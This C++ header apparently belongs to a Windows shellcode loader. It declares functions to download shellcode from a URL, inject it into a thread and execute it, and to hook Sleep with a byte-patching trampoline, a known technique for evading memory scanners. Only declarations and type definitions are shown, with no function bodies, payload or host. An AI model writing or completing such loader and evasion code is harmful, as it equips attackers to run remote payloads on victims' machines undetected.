#pragma once

#include <windows.h>
#include <iostream>
#include <sstream>
#include <iomanip>
#include <vector>
#include <winhttp.h>
#include <wininet.h>

#pragma comment(lib, "winhttp.lib")
#pragma comment(lib, "wininet.lib")

typedef void  (WINAPI* typeSleep)(
    DWORD dwMilis
    );

typedef DWORD(NTAPI* typeNtFlushInstructionCache)(
    HANDLE ProcessHandle,
    PVOID BaseAddress,
    ULONG NumberOfBytesToFlush
    );

typedef std::unique_ptr<std::remove_pointer<HANDLE>::type, decltype(&::CloseHandle)> HandlePtr;

struct HookedSleep
{
    typeSleep origSleep;
    BYTE    sleepStub[16];
};

struct HookTrampolineBuffers
{
    // (Input) Buffer containing bytes that should be restored while unhooking.
    BYTE* originalBytes;
    DWORD originalBytesSize;

    // (Output) Buffer that will receive bytes present prior to trampoline installation/restoring.
    BYTE* previousBytes;
    DWORD previousBytesSize;
};

template<class... Args>
void log(Args... args)
{
    std::stringstream oss;
    (oss << ... << args);

    std::cout << oss.str() << std::endl;
}

static const DWORD Shellcode_Memory_Protection = PAGE_EXECUTE_READ;

bool hookSleep();
void runShellcode(LPVOID param);
bool injectShellcode(std::vector<uint8_t>& shellcode, HandlePtr& thread);
bool downloadShellcode(const char* url, std::vector<uint8_t>& shellcode);
bool fastTrampoline(bool installHook, BYTE* addressToHook, LPVOID jumpAddress, HookTrampolineBuffers* buffers = NULL);
void WINAPI MySleep(DWORD _dwMilliseconds);
